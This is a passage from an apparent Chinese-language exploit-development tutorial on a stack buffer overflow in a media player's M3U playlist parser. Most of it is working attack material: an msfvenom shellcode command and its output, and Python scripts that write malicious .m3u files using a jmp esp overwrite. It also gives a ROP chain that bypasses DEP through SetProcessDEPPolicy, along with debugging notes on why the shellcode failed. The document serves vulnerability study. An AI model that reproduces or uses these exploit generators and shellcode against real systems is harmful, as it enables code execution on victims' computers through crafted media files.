    char cFullPath[MAX_PATH];
    memcpy(cFullPath, pcPlaylistFile, iPlaylist_DirBytes);
    strcpy(cFullPath + iPlaylist_DirBytes, pcFilename);
    CPL_AddSingleFile(hPlaylist, cFullPath, pcTitle);
首先定义绝对路径字符串，`MAX_PATH`定义
    #ifndef MAX_PATH
    #define MAX_PATH 1024
    #endif
这里其实`windows`定义了`MAX_PATH`，值为`260`，具体可以参考[stackoverflow的讨论](https://stackoverflow.com/questions/1880321/why-does-the-260-character-path-length-limit-exist-in-windows)，从`ida`逆向代码也可以验证这个结果，这里也决定了最长长度只要超过`260`，肯定会导致溢出
第二步，复制目录长度大小的数据到数组中
这步很关键，我在测试中，会将测试的`m3u`放在很多不同的目录下，比如桌面，c盘，导致溢出长度不停的变化，我也没有理解为什么。从源码中，可以发现目录的长度是占用溢出字符空间的！这也就导致了不同目录长度，`m3u`文件肯定不同。经过测试，`m3u`文件放在c盘根目录，溢出长度正好是`260`。
第三步，将`pcFilename`利用`strcpy`复制到`cFullPath`中，而`cFullPath`是从函数`CPL_AddFile`中读取出来的`cBuffer`，也就是`m3u`中的每行数据。之后
    void CPL_AddSingleFile(CP_HPLAYLIST hPlaylist, const char* pcPath, const char* pcTitle)
并不会改变`cFullPath`的数据，到这里栈溢出导致的漏洞原因分析清楚了。
## 漏洞利用
###  jmp esp
首先使用`msfvenom`生成`shellcode`
    root@kali32:~# msfvenom -a x86 --platform windows -p windows/exec cmd=calc -b "x00x0ax0d" -f python
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 284 (iteration=0)
    x86/shikata_ga_nai chosen with final size 284
    Payload size: 220 bytes
    Final size of python file: 1366 bytes
    buf =  ""
    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
    buf += "xe3x64x3ex05x62xf7xa2xca"
生成`exploit`
    dump = 'x41' * 260
    EIP = 'x53x93xd2x77' #jmp esp address
    buf =  ""
    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
    buf += "xe3x64x3ex05x62xf7xa2xca"
    fp = open("jmp_esp.m3u", "w") 
    fp.write(dump + EIP + buf)
    fp.close()
放在c盘下，打开文件测试
`shellcode`竟然崩了，用`windbg`检查
在返回前`40c9b6`设下断点，进入`shellcode`调试看看到底哪里出现了问题
`shellcode`开始处代码
    0:000> u esp
    +0x122203:
    00122204 dbda            fcmovnu st,st(2)
    00122206 d97424f4        fnstenv [esp-0Ch]
    0012220a bf2f939d5c      mov     edi,5C9D932Fh
    0012220f 58              pop     eax
    00122210 2bc9            sub     ecx,ecx
    00122212 b130            mov     cl,30h
    00122214 317818          xor     dword ptr [eax+18h],edi
    00122217 83e8fc          sub     eax,0FFFFFFFCh
继续调试
可以发现执行完`fnstenv [esp-0Ch]`，原先的`shellcode`指令已经被改写了。
继续执行，出错了
其实这里花了很长时间搞清楚到底怎么回事，因为`shellcode`是通过`msfvenom`生成的，正常情况下，不应该出现这样的问题。`shellcode`竟然将自己的代码空间栈改写了。经过长时间的搜索，发现了问题所在
在这本[书](https://books.google.com/books?id=sEobCgAAQBAJ&pg=PA77&lpg=PA77&dq=fnstenv+%5Besp-0Ch%5D&source=bl&ots=pCoAeaJQuQ&sig=1RR3SlhA1CK0IX_TwJ1wKtzql5o&hl=en&sa=X&ved=2ahUKEwjiwIiv64jfAhXIwMQHHXDoDngQ6AEwEXoECAMQAQ#v=onepage&q=fnstenv%20%5Besp-0Ch%5D&f=false)里，提到了这个问题
大概的意思就是`fnstenv
[esp-0Ch]`会改写从`esp-0ch`开始的`28`字节数据，所以为了保证从`esp`开始的数据不被重写，重新生成`exploit`文件
    dump = 'x41' * 260
    EIP = 'x53x93xd2x77' #jmp esp address
    buf =  ""
    buf += "xdbxdaxd9x74x24xf4xbfx2fx93x9dx5cx58x2b"
    buf += "xc9xb1x30x31x78x18x83xe8xfcx03x78x3bx71"
    buf += "x68xa0xabxf7x93x59x2bx98x1axbcx1ax98x79"
    buf += "xb4x0cx28x09x98xa0xc3x5fx09x33xa1x77x3e"
    buf += "xf4x0cxaex71x05x3cx92x10x85x3fxc7xf2xb4"
    buf += "x8fx1axf2xf1xf2xd7xa6xaax79x45x57xdfx34"
    buf += "x56xdcx93xd9xdex01x63xdbxcfx97xf8x82xcf"
    buf += "x16x2dxbfx59x01x32xfax10xbax80x70xa3x6a"
    buf += "xd9x79x08x53xd6x8bx50x93xd0x73x27xedx23"
    buf += "x09x30x2ax5exd5xb5xa9xf8x9ex6ex16xf9x73"
    buf += "xe8xddxf5x38x7exb9x19xbex53xb1x25x4bx52"
    buf += "x16xacx0fx71xb2xf5xd4x18xe3x53xbax25xf3"
    buf += "x3cx63x80x7fxd0x70xb9xddxbex87x4fx58x8c"
    buf += "x88x4fx63xa0xe0x7exe8x2fx76x7fx3bx14x88"
    buf += "x35x66x3cx01x90xf2x7dx4cx23x29x41x69xa0"
    buf += "xd8x39x8exb8xa8x3cxcax7ex40x4cx43xebx66"
    buf += "xe3x64x3ex05x62xf7xa2xca"
    junk = 'x41' * 20
    fp = open("jmp_esp.m3u", "w") 
    fp.write(dump + EIP + junk + buf)
    fp.write(buf)
    fp.close()
成功弹窗
这里还有一点需要注意，如果有想使用`MessageBox`弹窗的，并且利用`msfvenom`生成`shellcode`，会造成弹窗失败
可以注意一下`payload`的长度为`284`字节，加上溢出长度`260`字节，总长度是`544`字节，查看源码
     if(sscanf(pcPlaylistBuffer + iLastLineStartIDX, " %512[^rn]", cBuffer) == 1) <====
     {
         // Something has been read - ignore lines starting with #
         if(cBuffer[0] != '#')
             CPL_AddPrefixedFile(hPlaylist, cBuffer, NULL, pcFilename, iPlaylist_VolumeBytes, iPlaylist_DirectoryBytes);
     }
可以看到`cBuffer`最大长度不会超过`512`，超过的话`shellcode`就会被截断。
测试一下
可以看到`shellcode`确实被截断了。
###  bypass DEP
利用`SetProcessDepProcy`绕过`DEP`
    #encoding:utf-8
    import struct
    dump = 'x90' * 260
    ROP = ''
    ROP += struct.pack('<L',0x7711ab55) # POP EBX / RET
    ROP += struct.pack('<L',0xFFFFFFFF) # PARAMETER 0x00000000 - 0x1 = 0xFFFFFFFF
    ROP += struct.pack('<L',0x5d184ec0) # INC EBX / RET
    ROP += struct.pack('<L',0x77119293) # POP EBP / RET
    ROP += struct.pack('<L',0x7C862144) # <- SetProcessDEPPolicy
    ROP += struct.pack('<L',0x77114aa1) # POP EDI / RET
    ROP += struct.pack('<L',0x77d148c0) # RET
    ROP += struct.pack('<L',0x77112362) # POP ESI  / RET
    ROP += struct.pack('<L',0x77d148c0) # RET
    ROP += struct.pack('<L',0x77118cf7) # PUSHAD / RET
    buf = "xebx14x58xb2xbfx8ax18x32xdax88x18x40x81x38xfdxfdxfdxfdx75xf1xeb" 
    buf += "x05xe8xe7xffxffxffx43xd7xd5xb5x87xa1xd7xdcx36x6exf0xd7x8dxcbx2e" 
    buf += "xb3x34x4bx32xc1x4bx8cx64x08xbbx94x5cxd9x04x8cx8dxecxd7xcaxccxda" 
    buf += "xcdxebx8cx6dxdbx34xe5x8fx34xf4xb3x34xf6xa3x34xb6x34xd6xb7x12x82" 
    buf += "xd5xb5x87xa1xcaxbax2ax40xe8x47x2axdfx34xfax83x34xf3xbaxc7xbcx72" 
    buf += "x34xe6x9fxbcx62x8cx40xf8x34x8bx04xbcx4ax26xb0x01xb9x85x7bxcbxb7" 
    buf += "x7ex75xb8xbcx6fxf9x54x4ex84xebx9bxa3xcax5bx34xe6x9bxbcx62xd9x34" 
    buf += "x83xc4x34xe6xa3xbcx62xbcx93x04x2axe0x14xe8xdex82xd5xb5x87xa1xca" 
    buf += "x16x8cx64xecxd7xdbxddxd8xbfxd7xc8xd6xd1xd8x34x7bxecxefxefxecx40" 
    buf +=  "xe8x43xecx40xe8x47xfdxfdxfdxfd"
    file = open("setdeppolicy_bypass.m3u","w")
    file.write(dump + ROP + buf)
    file.close()
其中`shellcode`是从网上找的看雪[wingdbg](https://bbs.pediy.com/user-387462.htm)版主的，因为利用`msfvenom`生成的各种`shellcodde`长度都过长，导致被截断
## 总结
`shellcode`如果出错的话，分析起来会比较难，而且不容易发现出错点，但是感觉收获也会特别大。
由于能力有限，难免会有错误，欢迎批评指正，有改进也非常好。
## 参考
[exploitdb](https://www.exploit-db.com/exploits/15895)
[维基百科](https://zh.wikipedia.org/wiki/M3U)